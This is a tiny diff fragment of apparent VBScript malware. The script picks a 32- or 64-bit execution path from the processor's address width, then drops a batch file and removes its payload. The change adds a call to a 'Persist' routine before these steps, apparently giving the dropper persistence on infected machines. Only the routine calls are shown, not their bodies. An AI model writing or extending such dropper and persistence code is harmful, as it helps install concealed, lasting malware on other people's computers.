@@ -5,6 +5,7 @@ If GetObject("winmgmts:root\cimv2:Win32_Processor='cpu0'").AddressWidth = 32 The
 Else
     Execute64
 End If
+Persist
 DropBat
 RemovePayload
 End Sub
